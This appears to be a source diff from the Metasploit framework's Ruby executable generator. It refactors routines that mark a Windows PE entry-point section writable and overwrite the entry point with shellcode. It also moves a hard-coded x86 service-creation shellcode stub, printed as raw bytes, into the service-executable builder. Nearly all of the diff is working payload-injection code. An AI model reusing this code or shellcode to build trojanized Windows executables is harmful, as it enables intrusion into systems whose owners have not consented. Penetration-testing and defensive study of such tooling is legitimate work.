@@ -314,25 +314,48 @@ require 'msf/core/exe/segment_injector'
         exe = fd.read(fd.stat.size)
       }
 
+    pe_header_size = 0x18
+    section_size = 0x28
+    characteristics_offset = 0x24
+    virtualAddress_offset = 0x0c
+    sizeOfRawData_offset = 0x10
+
+    sections_table_rva =
+      pe._dos_header.v['e_lfanew'] +
+      pe._file_header.v['SizeOfOptionalHeader'] +
+      pe_header_size
+
+    sections_table_offset = pe.rva_to_file_offset(sections_table_rva)
+
+    sections_table_characteristics_offset =
+      pe.rva_to_file_offset(sections_table_rva + characteristics_offset)
+
     sections_header = []
-    pe._file_header.v['NumberOfSections'].times { |i| sections_header << [(i*0x28)+pe.rva_to_file_offset(pe._dos_header.v['e_lfanew']+pe._file_header.v['SizeOfOptionalHeader']+0x18+0x24),exe[(i*0x28)+pe.rva_to_file_offset(pe._dos_header.v['e_lfanew']+pe._file_header.v['SizeOfOptionalHeader']+0x18),0x28]] }
+    pe._file_header.v['NumberOfSections'].times { |i|
+      section_offset = sections_table_offset + (i * section_size)
+      sections_header << [
+        sections_table_characteristics_offset + (i * section_size),
+        exe[section_offset,section_size]
+      ]
+    }
 
-
-    #look for section with entry point
+    # look for section with entry point
     sections_header.each do |sec|
-      virtualAddress = sec[1][0xc,0x4].unpack('L')[0]
-      sizeOfRawData = sec[1][0x10,0x4].unpack('L')[0]
-      characteristics = sec[1][0x24,0x4].unpack('L')[0]
-      if pe.hdr.opt.AddressOfEntryPoint >= virtualAddress && pe.hdr.opt.AddressOfEntryPoint < virtualAddress+sizeOfRawData
-        #put this section writable
-        characteristics|=0x80000000
+      virtualAddress = sec[1][virtualAddress_offset,0x4].unpack('L')[0]
+      sizeOfRawData = sec[1][sizeOfRawData_offset,0x4].unpack('L')[0]
+      characteristics = sec[1][characteristics_offset,0x4].unpack('L')[0]
+
+      if (virtualAddress...virtualAddress+sizeOfRawData).include?(pe.hdr.opt.AddressOfEntryPoint)
+        # put this section writable
+        characteristics |= 0x8000_0000
         newcharacteristics = [characteristics].pack('L')
-        exe[sec[0],newcharacteristics.length]=newcharacteristics
+        exe[sec[0],newcharacteristics.length] = newcharacteristics
       end
     end
 
-    #put the shellcode at the entry point, overwriting template
-    exe[pe.rva_to_file_offset(pe.hdr.opt.AddressOfEntryPoint),code.length]=code
+    # put the shellcode at the entry point, overwriting template
+    entryPoint_file_offset = pe.rva_to_file_offset(pe.hdr.opt.AddressOfEntryPoint)
+    exe[entryPoint_file_offset,code.length] = code
 
     return exe
   end
@@ -403,7 +426,6 @@ require 'msf/core/exe/segment_injector'
     pushes
   end
 
-
   def self.exe_sub_method(code,opts ={})
 
     pe = ''
@@ -413,96 +435,32 @@ require 'msf/core/exe/segment_injector'
 
     case opts[:exe_type]
       when :service_exe
-        exe = Rex::PeParsey::Pe.new_from_file(opts[:template], true)
         max_length = 8192
         name = opts[:servicename]
 
-        name ||= Rex::Text.rand_text_alpha(7)
-        
-        pushed_service_name = string_to_pushes(name)
-
-        # code_service could be encoded in the future
-        code_service =
-          "\xFC\xE8\x89\x00\x00\x00\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B" +
-          "\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0" +
-          "\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\xE2\xF0\x52\x57" +
-          "\x8B\x52\x10\x8B\x42\x3C\x01\xD0\x8B\x40\x78\x85\xC0\x74\x4A\x01" +
-          "\xD0\x50\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x3C\x49\x8B\x34\x8B" +
-          "\x01\xD6\x31\xFF\x31\xC0\xAC\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF4" +
-          "\x03\x7D\xF8\x3B\x7D\x24\x75\xE2\x58\x8B\x58\x24\x01\xD3\x66\x8B" +
-          "\x0C\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24" +
-          "\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x58\x5F\x5A\x8B\x12\xEB\x86\x5D" +
-          "\x6A\x00\x68\x70\x69\x33\x32\x68\x61\x64\x76\x61\x54\x68\x4C\x77" +
-          "\x26\x07\xFF\xD5"+pushed_service_name+"\x89\xE1" +
-          "\x8D\x85\xD0\x00\x00\x00\x6A\x00\x50\x51\x89\xE0\x6A\x00\x50\x68" +
-          "\xFA\xF7\x72\xCB\xFF\xD5\x6A\x00\x68\xF0\xB5\xA2\x56\xFF\xD5\x58" +
-          "\x58\x58\x58\x31\xC0\xC3\xFC\xE8\x00\x00\x00\x00\x5D\x81\xED\xD6" +
-          "\x00\x00\x00"+pushed_service_name+"\x89\xE1\x8D" +
-          "\x85\xC9\x00\x00\x00\x6A\x00\x50\x51\x68\x0B\xAA\x44\x52\xFF\xD5" +
-          "\x6A\x00\x6A\x00\x6A\x00\x6A\x00\x6A\x00\x6A\x00\x6A\x04\x6A\x10" +
-          "\x89\xE1\x6A\x00\x51\x50\x68\xC6\x55\x37\x7D\xFF\xD5"
-
-        pe_header_size = 0x18
-        section_size = 0x28
-        characteristics_offset = 0x24
-        virtualAddress_offset = 0x0c
-        sizeOfRawData_offset = 0x10
-
-        sections_table_rva = 
-          exe._dos_header.v['e_lfanew'] + 
-          exe._file_header.v['SizeOfOptionalHeader'] + 
-          pe_header_size
-
-        sections_table_offset = exe.rva_to_file_offset(sections_table_rva)
-
-        sections_table_characteristics_offset = 
-          exe.rva_to_file_offset(sections_table_rva + characteristics_offset)
-
-        sections_header = []
-        exe._file_header.v['NumberOfSections'].times { |i|
-          section_offset = sections_table_offset + (i * section_size)
-          sections_header << [
-            sections_table_characteristics_offset + (i * section_size),
-            pe[section_offset,section_size]
-          ]
-        }
-
-        # look for section with entry point
-        sections_header.each do |sec|
-          virtualAddress = sec[1][virtualAddress_offset,0x4].unpack('L')[0]
-          sizeOfRawData = sec[1][sizeOfRawData_offset,0x4].unpack('L')[0]
-          characteristics = sec[1][characteristics_offset,0x4].unpack('L')[0]
-
-          if (virtualAddress...virtualAddress+sizeOfRawData).include?(exe.hdr.opt.AddressOfEntryPoint)
-            # put this section writable
-            characteristics |= 0x8000_0000
-            newcharacteristics = [characteristics].pack('L')
-            pe[sec[0],newcharacteristics.length] = newcharacteristics
-          end
+        if name
+          bo = pe.index('SERVICENAME')
+          raise RuntimeError, "Invalid PE Service EXE template: missing \"SERVICENAME\" tag" if not bo
+          pe[bo, 11] = [name].pack('a11')
         end
 
-        # put the shellcode at the entry point, overwriting template
-        entryPoint_file_offset = exe.rva_to_file_offset(exe.hdr.opt.AddressOfEntryPoint)
-        my_payload_length = code_service.length + code.length
-        payload_service = code_service + code
-        pe[entryPoint_file_offset,my_payload_length] = payload_service
-
+        if not opts[:sub_method]
+          pe[136, 4] = [rand(0x100000000)].pack('V')
+        end
       when :dll
         max_length = 2048
       when :exe_sub
         max_length = 4096
     end
 
-    if opts[:exe_type] != :service_exe
+    bo = pe.index('PAYLOAD:')
+    raise RuntimeError, "Invalid PE EXE subst template: missing \"PAYLOAD:\" tag" if not bo
 
-      bo = pe.index('PAYLOAD:')
-      raise RuntimeError, "Invalid PE EXE subst template: missing \"PAYLOAD:\" tag" if not bo
-
-      if (code.length <= max_length)
-        pe[bo, code.length] = [code].pack("a*")
-      else
-        raise RuntimeError, "The EXE generator now has a max size of #{max_length} bytes, please fix the calling module"
-      end
+    if (code.length <= max_length)
+      pe[bo, code.length] = [code].pack("a*")
+    else
+      raise RuntimeError, "The EXE generator now has a max size of #{max_length} bytes, please fix the calling module"
+    end
 
     if opts[:exe_type] == :dll
       mt = pe.index('MUTEX!!!')
@@ -548,10 +506,39 @@ require 'msf/core/exe/segment_injector'
   end
 
   def self.to_win32pe_service(framework, code, opts={})
-    # Allow the user to specify their own service EXE template
-    set_template_default(opts, "template_x86_windows.exe")
-    opts[:exe_type] = :service_exe
-    exe_sub_method(code,opts)
+    if opts[:sub_method]
+      # Allow the user to specify their own service EXE template
+      set_template_default(opts, "template_x86_windows_svc.exe")
+      opts[:exe_type] = :service_exe
+      exe_sub_method(code,opts)
+    else
+      name = opts[:servicename]
+      name ||= Rex::Text.rand_text_alpha(7)
+      pushed_service_name = string_to_pushes(name)
+
+      # code_service could be encoded in the future
+      code_service =
+        "\xFC\xE8\x89\x00\x00\x00\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B" +
+        "\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0" +
+        "\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\xE2\xF0\x52\x57" +
+        "\x8B\x52\x10\x8B\x42\x3C\x01\xD0\x8B\x40\x78\x85\xC0\x74\x4A\x01" +
+        "\xD0\x50\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x3C\x49\x8B\x34\x8B" +
+        "\x01\xD6\x31\xFF\x31\xC0\xAC\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF4" +
+        "\x03\x7D\xF8\x3B\x7D\x24\x75\xE2\x58\x8B\x58\x24\x01\xD3\x66\x8B" +
+        "\x0C\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24" +
+        "\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x58\x5F\x5A\x8B\x12\xEB\x86\x5D" +
+        "\x6A\x00\x68\x70\x69\x33\x32\x68\x61\x64\x76\x61\x54\x68\x4C\x77" +
+        "\x26\x07\xFF\xD5"+pushed_service_name+"\x89\xE1" +
+        "\x8D\x85\xD0\x00\x00\x00\x6A\x00\x50\x51\x89\xE0\x6A\x00\x50\x68" +
+        "\xFA\xF7\x72\xCB\xFF\xD5\x6A\x00\x68\xF0\xB5\xA2\x56\xFF\xD5\x58" +
+        "\x58\x58\x58\x31\xC0\xC3\xFC\xE8\x00\x00\x00\x00\x5D\x81\xED\xD6" +
+        "\x00\x00\x00"+pushed_service_name+"\x89\xE1\x8D" +
+        "\x85\xC9\x00\x00\x00\x6A\x00\x50\x51\x68\x0B\xAA\x44\x52\xFF\xD5" +
+        "\x6A\x00\x6A\x00\x6A\x00\x6A\x00\x6A\x00\x6A\x00\x6A\x04\x6A\x10" +
+        "\x89\xE1\x6A\x00\x51\x50\x68\xC6\x55\x37\x7D\xFF\xD5"
+
+      to_winpe_only(framework, code_service + code, opts)
+    end
   end
 
   def self.to_win64pe_service(framework, code, opts={})
